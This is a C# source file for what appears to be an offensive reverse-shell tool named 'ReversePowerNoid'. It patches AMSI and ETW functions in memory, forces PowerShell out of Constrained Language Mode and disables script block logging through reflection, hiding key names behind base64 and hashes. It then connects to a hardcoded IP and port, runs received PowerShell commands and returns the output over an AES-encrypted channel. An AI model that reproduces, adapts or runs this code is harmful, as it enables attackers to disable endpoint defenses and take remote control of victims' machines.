using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Text;
using System.Linq;
using System.Management.Automation;
using System.Threading;
using System.Globalization;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class Patch4MS1And3TW {

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    // Thx D/Invoke!
    public static IntPtr G3t3xp0rt4ddr3ss(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero) {
            // Export not found
            throw new MissingMethodException(ExportName + " not found.");
        }
        return FunctionPtr;
    }

    private static void Patch3TW() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                string patchbytestring2 = "33,c0,c2,14,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }else {
                string patchbytestring2 = "48,33,C0,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr funcPtr = G3t3xp0rt4ddr3ss(libPtr, (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("RXR3R" + "XZlb" + "nRXc" + "ml0ZQ" + "=="))));
            IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
            UInt32 oldProtect = 0;
            VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
            Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
            UInt32 newProtect = 0;
            VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, oldProtect, out newProtect);
        }catch (Exception e) {
            Console.WriteLine(" [!] {0}", e.Message);
            Console.WriteLine(" [!] {0}", e.InnerException);
        }
    }

    private static void Patch4MS1() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }else {
                string patchbytestring2 = "B8,57,00,07,80,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr libPtr;
            try{ libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{ libPtr = IntPtr.Zero; }
            if (libPtr != IntPtr.Zero) {
                IntPtr funcPtr = G3t3xp0rt4ddr3ss(libPtr, (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("QW1za" + "VNjYW5" + "CdWZ" + "mZXI="))));
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                UInt32 oldProtect = 0;
                VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                UInt32 newProtect = 0;
                VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, oldProtect, out newProtect);
            }
        }catch (Exception e) {
            Console.WriteLine(" [!] {0}", e.Message);
            Console.WriteLine(" [!] {0}", e.InnerException);
        }
    }

    public static void Run() {
        Patch4MS1();
        Patch3TW();
    }
}

public class ReversePowerNoid
{
    static string Password = "Sup3rS3cur3P4ssw0rd";
    static string HardcodedServerAddress = "192.168.0.9";
    static int HardcodedServerPort = 3249;

    public static ulong GetHash(string data)
    {
        ulong val = 5381;
        data = data.ToLower();
        foreach(char b in data)
        {
            UInt32 n = (UInt32)((val << 5) & 0xffffffff);
            val = (n + val) + b;
        }

        return val;
    }

    public static bool CheckIfSocketIsConnected2(Socket handler) {
        // Convert the string data to byte data using ASCII encoding.
        byte[] byteData = Encoding.ASCII.GetBytes("NOCOMMCHECK");
        try { handler.Send(byteData); return true; }catch {
            return false;
        }
    }

    public static byte[] ReadByteArray(Stream s)
    {
        byte[] rawLength = new byte[sizeof(int)];
        if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
        {
            throw new SystemException("Stream did not contain properly formatted byte array");
        }

        byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
        if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
        {
            throw new SystemException("Did not read byte array properly");
        }

        return buffer;
    }

    public static string EncryptStringAES(string rawstring, string password) {
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        string outStr = null;                       
        RijndaelManaged aesAlg = null;              
        try {
            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
            aesAlg = new RijndaelManaged();
            aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
                msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        swEncrypt.Write(rawstring);
                    }
                }
                outStr = Convert.ToBase64String(msEncrypt.ToArray());
            }
        }
        finally
        {
            if (aesAlg != null)
                aesAlg.Clear();
        }
        return outStr;
    }

    public static string DecryptStringAES(string encryptedString, string password) {
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        RijndaelManaged aesAlg = null;
        string plaintext = null;
        try
        {
            Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, saltBytes);
            byte[] bytes = Convert.FromBase64String(encryptedString);
            using (MemoryStream msDecrypt = new MemoryStream(bytes)) {
                aesAlg = new RijndaelManaged();
                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                aesAlg.IV = ReadByteArray(msDecrypt);
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt)) {
                        plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
        }
        finally
        {
            if (aesAlg != null)
                aesAlg.Clear();
        }
        return plaintext;
    }

    public static bool DisableCLM(PowerShell rs) {
        bool ret = false;

        try
        {
            // Switches back to FullLanguage in CLM
            if (Runspace.DefaultRunspace != null)
            {
                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                // Bypasses PowerShell execution policy
                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
                ret |= true;
            }
        }catch (Exception e) {
            //Console.WriteLine("   [-] Approach #1 failed: " + e.Message);
        }

        try
        {
            rs.Runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
            rs.Runspace.InitialSessionState.AuthorizationManager = null;
            rs.Runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
            ret |= true;
        }catch (Exception e) {
            //Console.WriteLine("   [-] Approach #2 failed: " + e.Message);
        }

        return ret;
    }

    public static bool DisableScriptLogging(PowerShell rs)
    {
        bool ret = false;
        string param = "";
        ret |= DisableScriptLoggingTechnique1(rs, ref param);
        ret |= DisableScriptLoggingTechnique2(rs, param);
        return ret;
    }

    public static bool DisableScriptLoggingTechnique1(PowerShell rs, ref string param)
    {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        Assembly[] assems = currentDomain.GetAssemblies();

        foreach (Assembly assem in assems)
        {
            if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
            {
                Type[] types = assem.GetTypes();
                foreach (var tp in types)
                {
                    if (GetHash(tp.Name) == 12579468197) // UXtils
                    {
                        var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                        foreach (var f in fields)
                        {
                            if (GetHash(f.Name) == 12250760746)
                            {
                                HashSet<string> names = (HashSet<string>)f.GetValue(null);
                                foreach (var n in names)
                                {
                                    if (GetHash(n) == 32086076268) // ScrXiptBloXckLogXging
                                    {
                                        param = n;
                                        break;
                                    }
                                }

                                f.SetValue(null, new HashSet<string>(StringComparer.OrdinalIgnoreCase) { });
                                return true;
                            }
                        }
                    }
                }
            }
        }

        return false;
    }

    public static bool DisableScriptLoggingTechnique2(PowerShell rs, string param)
    {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        Assembly[] assems = currentDomain.GetAssemblies();

        foreach (Assembly assem in assems)
        {
            if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
            {
                Type[] types = assem.GetTypes();
                foreach (var tp in types)
                {
                    if (GetHash(tp.Name) == 12579468197) // UXtils
                    {
                        var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                        FieldInfo field = null;
                        foreach (var f in fields)
                        {
                            if (GetHash(f.Name) == 52485150955) // caXchedGrXoupPoXlicySettXings
                            {
                                field = f;
                                break;
                            }
                        }

                        if(field != null)
                        {
                            Dictionary<string, object> cached = (Dictionary<string, object>)field.GetValue(null);
                            string key = param;

                            if (key.Length == 0)
                            {
                                foreach (string k in cached.Keys)
                                {
                                    if (GetHash(k) == 32086076268) // ScrXiptBloXckLogXging
                                    {
                                        key = k;
                                        break;
                                    }
                                }
                            }

                            if(key.Length > 0 && cached[key] != null)
                            {
                                Dictionary<string, object> cached2 = (Dictionary<string, object>)cached[key];
                                string k2 = "";
                                string k3 = "";

                                foreach (string k in cached2.Keys)
                                {
                                    if (GetHash(k) == 45083803091) // EnabXleScrXiptBloXckLogXging
                                    {
                                        k2 = k;
                                    }
                                    else if (GetHash(k) == 70211596397) // EnabXleScrXiptBloXckInvocXationLogXging
                                    {
                                        k3 = k;
                                    }
                                }

                                if (k2.Length > 0 && cached2[k2] != null) cached2[k2] = 0;
                                if (k3.Length > 0 && cached2[k3] != null) cached2[k3] = 0;
                            }

                            var newCache = new Dictionary<string, object>();
                            newCache.Add(String.Format("Enable{0}", param), 0);
                            string param2 = param.Replace("kL", "kInvocationL");
                            newCache.Add(String.Format("Enable{0}", param2), 0);
                            cached[String.Format("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\{0}", param)] = newCache;

                            return true;
                        }
                    }
                }
            }
        }

        return false;
    }

    public static bool DisableAmsi(PowerShell rs)
    {
        bool ret = false;
        ret |= DisableAmsiTechnique1(rs);
        ret |= DisableAmsiTechnique2(rs);
        return ret;
    }

    public static bool DisableAmsiTechnique1(PowerShell rs)
    {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        Assembly[] assems = currentDomain.GetAssemblies();

        foreach (Assembly assem in assems)
        {
            if(assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
            {
                Type[] types = assem.GetTypes();
                foreach (var tp in types)
                {
                    if(GetHash(tp.Name) == 13944524928) // AmsiUXtils
                    {
                        var fields = tp.GetFields(BindingFlags.NonPublic|BindingFlags.Static);
                        foreach (var f in fields)
                        {
                            if (GetHash(f.Name) == 27628075080) // amsiInXitFaXiled
                            {
                                f.SetValue(null, true);
                                return (bool)f.GetValue(null);
                            }
                        }
                    }
                }
            }
        }

        return false;
    }

    public static bool DisableAmsiTechnique2(PowerShell rs)
    {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        Assembly[] assems = currentDomain.GetAssemblies();

        foreach (Assembly assem in assems)
        {
            if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
            {
                Type[] types = assem.GetTypes();
                foreach (var tp in types)
                {
                    if (GetHash(tp.Name) == 13944524928) // AmsiUXtils
                    {
                        var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                        foreach (var f in fields)
                        {
                            if (GetHash(f.Name) == 21195228531) // amsiSesXsion
                            {
                                f.SetValue(null, null);
                            }
                            else if (GetHash(f.Name) == 18097066420) // amsiConXtext
                            {
                                IntPtr hglobal = Marshal.AllocHGlobal(9077);
                                f.SetValue(null, hglobal);
                            }
                        }
                    }
                }
            }
        }

        return false;
    }

    public static bool DisableETW(PowerShell ps) {
        try {
            BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
            var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider != null)
            {
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }
            return true;
        }catch {
            return false;
        }
    }

    public static bool DisableDefense(PowerShell ps, CustomPSHost host) {

        // checking powershell version
        string l = ExecuteCommand(@"'{0}.{1}' -f $PSVersionTable.PSVersion.Major, $PSVersionTable.PSVersion.Minor", ps, host).Trim();
        float psversion = 5;
        try {
            System.Globalization.CultureInfo customCulture = (System.Globalization.CultureInfo)System.Threading.Thread.CurrentThread.CurrentCulture.Clone();
            customCulture.NumberFormat.NumberDecimalSeparator = ".";

            System.Threading.Thread.CurrentThread.CurrentCulture = customCulture;
            psversion = float.Parse(l, System.Globalization.CultureInfo.InvariantCulture);
        }
        catch (FormatException e) {
            //Console.WriteLine("[-] Could not obtain Powershell's version. Assuming 5.0 (exception: {0})", e.Message);
        }
        if (psversion < 5.0) {
            //Console.WriteLine("[+] Powershell version is below 5, so AMSI, CLM, SBL are not available anyway :-)");
            //Console.WriteLine("Skipping bypass procedures...");
            return true;
        }else {
            //Console.WriteLine("[*] Powershell's version: {0}", psversion);
        }
        //Console.WriteLine("[+] Disabling CLM...");
        // attempting to disable CLM
        bool disableCLMresult = DisableCLM(ps);
        if (disableCLMresult) {
            //Console.WriteLine("   [+] It seems that we successfully disable CLM!");
        }else {
            //Console.WriteLine("   [-] It seems that we failed to disable CLM :')");
        }
        // check CLM status
        l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", ps, host).Trim();
        //Console.WriteLine("   [*] Language Mode after attempting to disable CLM: {0}", l);
        if (String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase)) {
            //Console.WriteLine("      [+] Constrained Language Mode Disabled.");
        }else {
            //Console.WriteLine("      [-] Constrained Language Mode not disabled.");
            return false;
        }
        // attempting to disable SBL
        //Console.WriteLine("[*] Disabling SBL...");
        bool disableSBLresult = DisableScriptLogging(ps);
        if (disableSBLresult) {
            //Console.WriteLine("   [+] It seems that we successfully disable SBL!");
        }else {
            //Console.WriteLine("   [-] It seems that we failed to disable SBL :')");
            return false;
        }
        // attempting to disable AMSI
        //Console.WriteLine("[*] Disabling AMSI...");
        bool disableAMSIresult = DisableAmsi(ps);
        if (disableAMSIresult) {
            //Console.WriteLine("   [+] It seems that we successfully disable AMSI!");
        }else {
            //Console.WriteLine("   [-] It seems that we failed to disable AMSI :')");
            return false;
        }
        bool disableETWresult = DisableETW(ps);
        if (disableETWresult) {
            //Console.WriteLine("   [+] It seems that we successfully disable ETW!");
        }else {
            //Console.WriteLine("   [-] It seems that we failed to disable ETW :')");
            return false;
        }
        Patch4MS1And3TW.Run();
        return true;
    }

    public static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host)
    {
        string output = String.Empty;
        if (command != null && command.Length > 0)
        {
            using (Pipeline pipe = rs.Runspace.CreatePipeline())
            {
                Collection<PSObject> backupoutput = new Collection<PSObject>();
                pipe.Commands.AddScript(command);
                pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                pipe.Commands.Add("Out-string");

                string interceptedOutput = String.Empty;
                TextWriter originalConsoleOut = Console.Out; // preserve the original stream
                using(var writer = new StringWriter()) {
                    Console.SetOut(writer);
                    try
                    {
                        backupoutput = pipe.Invoke();
                        output = ((CustomPSHostUserInterface)host.UI).Output;
                        ((CustomPSHostUserInterface)host.UI).Clear();
                    }
                    catch (Exception e)
                    {
                        Console.SetOut(originalConsoleOut);
                        return e.Message;
                    }
                    writer.Flush();
                    interceptedOutput = writer.GetStringBuilder().ToString();
                }
                // restore original stream
                Console.SetOut(originalConsoleOut);
                if (String.IsNullOrEmpty(output.Trim())) {
                    output = interceptedOutput;
                }
                foreach (PSObject obj in backupoutput)
                {
                    output += obj.ToString();
                }
            }
        }
        return output;
    }

    public static Socket TryConnect(string ServerAddress, int port) {
        // Establish the remote endpoint for the socket.  
        IPAddress ipAddress = IPAddress.Parse(ServerAddress);
        IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);

        // Create a TCP/IP  socket.  
        Socket handler = new Socket(ipAddress.AddressFamily,
            SocketType.Stream, ProtocolType.Tcp );  
        Console.WriteLine("[*] Connecting to server...");
        while (true) {
            try {
                handler.Connect(remoteEP);
                break;
            }catch {}
        }  
        Console.WriteLine("[+] Client connected to {0}", handler.RemoteEndPoint.ToString());
        return handler;
    }

    public static void Send(Socket handler, String data) {
        string dataEnc = EncryptStringAES(data, Password);
        byte[] byteData = Encoding.ASCII.GetBytes(dataEnc);
        handler.Send(byteData);
    }

    public static string Receive(Socket handler) {
        byte[] bytes = new byte[501474836];  
        int bytesRec = handler.Receive(bytes);
        if (String.IsNullOrEmpty(Encoding.ASCII.GetString(bytes,0,bytesRec))) {
            return String.Empty;
        }
        return DecryptStringAES(Encoding.ASCII.GetString(bytes,0,bytesRec), Password);
    }

    public static bool CheckIfSocketIsConnected(Socket s)
    {
        bool part1 = s.Poll(1000, SelectMode.SelectRead);
        bool part2 = (s.Available == 0);
        if (part1 && part2)
            return false;
        else
            return true;
    }

    public static void StartReversePowernoid(string ServerAddress, int port) {
        CustomPSHost host = new CustomPSHost();
        var state = InitialSessionState.CreateDefault();
        state.AuthorizationManager = null;                  // Bypass PowerShell execution policy

        using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
        {
            runspace.ApartmentState = ApartmentState.STA;
            runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;
            runspace.Open();

            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                bool disabledefenses = DisableDefense(ps, host);
                if (!disabledefenses) {
                    Console.WriteLine("[-] Failed to disable one/more of the defense system, exiting...");
                    Environment.Exit(0);
                }else {
                    Console.Write("[+] Successfully disable defense system! Dropping shell");
                    Thread.Sleep(1000);
                    Console.Write(".");
                    Thread.Sleep(1000);
                    Console.Write(".");
                    Thread.Sleep(1000);
                    Console.WriteLine(".");
                    Thread.Sleep(1000);
                }
                Socket connhandler = TryConnect(ServerAddress, port);
                while(true)
                {
                    Send(connhandler, ExecuteCommand("(Resolve-Path .\\).Path", ps, host).Trim());
                    string command = Receive(connhandler).Trim();
                    if (String.Equals(command, "exit", StringComparison.OrdinalIgnoreCase)) {
                        Console.WriteLine("Bye bye!");
                        connhandler.Shutdown(SocketShutdown.Both);  
                        connhandler.Close(); 
                        Environment.Exit(0);
                    }
                    if (String.Equals(command, "NOCOMM", StringComparison.OrdinalIgnoreCase)) {
                        continue;
                    }

                    if (String.IsNullOrEmpty(command)) {
                        if (CheckIfSocketIsConnected2(connhandler)) {
                            // Release the socket.  
                            try {
                                connhandler.Shutdown(SocketShutdown.Both);  
                                connhandler.Close();  
                            }catch {}
                            Console.WriteLine("   [-] Client disconnected from server!");
                            Environment.Exit(0);
                        }
                    }

                    string output = ExecuteCommand(command, ps, host);
                    if (String.IsNullOrEmpty(output)) {
                        output = "OK";
                    }
                    Send(connhandler, output);
                }
            }
        }
    }

    public static void Main() {
        StartReversePowernoid(HardcodedServerAddress, HardcodedServerPort);
    }

    public class CustomPSHost : PSHost
    {
        private Guid _hostId = Guid.NewGuid();
        private CustomPSHostUserInterface _ui = new CustomPSHostUserInterface();

        public override Guid InstanceId
        {
            get { return _hostId; }
        }

        public override string Name
        {
            get { return "ConsoleHost"; }
        }

        public override Version Version
        {
            get { return new Version(1, 0); }
        }

        public override PSHostUserInterface UI
        {
            get { return _ui; }
        }


        public override CultureInfo CurrentCulture
        {
            get { return Thread.CurrentThread.CurrentCulture; }
        }

        public override CultureInfo CurrentUICulture
        {
            get { return Thread.CurrentThread.CurrentUICulture; }
        }

        public override void EnterNestedPrompt()
        {
            throw new NotImplementedException("EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override void ExitNestedPrompt()
        {
            throw new NotImplementedException("ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override void NotifyBeginApplication()
        {
            return;
        }

        public override void NotifyEndApplication()
        {
            return;
        }

        public override void SetShouldExit(int exitCode)
        {
            return;
        }
    }

    public class CustomPSHostUserInterface : PSHostUserInterface
    {
        // Replace StringBuilder with whatever your preferred output method is (e.g. a socket or a named pipe)
        private StringBuilder _sb;
        private CustomPSRHostRawUserInterface _rawUi = new CustomPSRHostRawUserInterface();

        public CustomPSHostUserInterface()
        {
            _sb = new StringBuilder();
        }

        public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
        {
            _sb.Append(value);
        }

        public override void WriteLine()
        {
            _sb.Append("\n");
        }

        public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
        {
            _sb.Append(value + "\n");
        }

        public override void Write(string value)
        {
            _sb.Append(value);
        }

        public override void WriteDebugLine(string message)
        {
            _sb.AppendLine("DEBUG: " + message);
        }

        public override void WriteErrorLine(string value)
        {
            _sb.AppendLine("ERROR: " + value);
        }

        public override void WriteLine(string value)
        {
            _sb.AppendLine(value);
        }

        public override void WriteVerboseLine(string message)
        {
            _sb.AppendLine("VERBOSE: " + message);
        }

        public override void WriteWarningLine(string message)
        {
            _sb.AppendLine("WARNING: " + message);
        }

        public override void WriteProgress(long sourceId, ProgressRecord record)
        {
            return;
        }

        public void Clear() {
            _sb = new StringBuilder();
        }

        public string Output
        {
            get { return _sb.ToString(); }
        }

        public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
        {
            throw new NotImplementedException("Prompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
        {
            throw new NotImplementedException("PromptForChoice is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
        {
            throw new NotImplementedException("PromptForCredential1 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
        {
            throw new NotImplementedException("PromptForCredential2 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override PSHostRawUserInterface RawUI
        {
            get { return _rawUi; }
        }

        public override string ReadLine()
        {
            throw new NotImplementedException("ReadLine is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override System.Security.SecureString ReadLineAsSecureString()
        {
            throw new NotImplementedException("ReadLineAsSecureString is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }
    }


    class CustomPSRHostRawUserInterface : PSHostRawUserInterface
    {
        // Warning: Setting _outputWindowSize too high will cause OutOfMemory execeptions.  I assume this will happen with other properties as well
        private Size _windowSize = new Size { Width = 120, Height = 100 };

        private Coordinates _cursorPosition = new Coordinates { X = 0, Y = 0 };

        private int _cursorSize = 1;
        private ConsoleColor _foregroundColor = ConsoleColor.White;
        private ConsoleColor _backgroundColor = ConsoleColor.Black;

        private Size _maxPhysicalWindowSize = new Size
        {
            Width = int.MaxValue,
            Height = int.MaxValue
        };

        private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
        private Size _bufferSize = new Size { Width = 100, Height = 1000 };
        private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
        private String _windowTitle = "";

        public override ConsoleColor BackgroundColor
        {
            get { return _backgroundColor; }
            set { _backgroundColor = value; }
        }

        public override Size BufferSize
        {
            get { return _bufferSize; }
            set { _bufferSize = value; }
        }

        public override Coordinates CursorPosition
        {
            get { return _cursorPosition; }
            set { _cursorPosition = value; }
        }

        public override int CursorSize
        {
            get { return _cursorSize; }
            set { _cursorSize = value; }
        }

        public override void FlushInputBuffer()
        {
            throw new NotImplementedException("FlushInputBuffer is not implemented.");
        }

        public override ConsoleColor ForegroundColor
        {
            get { return _foregroundColor; }
            set { _foregroundColor = value; }
        }

        public override BufferCell[,] GetBufferContents(Rectangle rectangle)
        {
            throw new NotImplementedException("GetBufferContents is not implemented.");
        }

        public override bool KeyAvailable
        {
            get { throw new NotImplementedException("KeyAvailable is not implemented."); }
        }

        public override Size MaxPhysicalWindowSize
        {
            get { return _maxPhysicalWindowSize; }
        }

        public override Size MaxWindowSize
        {
            get { return _maxWindowSize; }
        }

        public override KeyInfo ReadKey(ReadKeyOptions options)
        {
            throw new NotImplementedException("ReadKey is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
        }

        public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
        {
            throw new NotImplementedException("ScrollBufferContents is not implemented");
        }

        public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
        {
            throw new NotImplementedException("SetBufferContents is not implemented.");
        }

        public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
        {
            throw new NotImplementedException("SetBufferContents is not implemented");
        }

        public override Coordinates WindowPosition
        {
            get { return _windowPosition; }
            set { _windowPosition = value; }
        }

        public override Size WindowSize
        {
            get { return _windowSize; }
            set { _windowSize = value; }
        }

        public override string WindowTitle
        {
            get { return _windowTitle; }
            set { _windowTitle = value; }
        }
    }

}
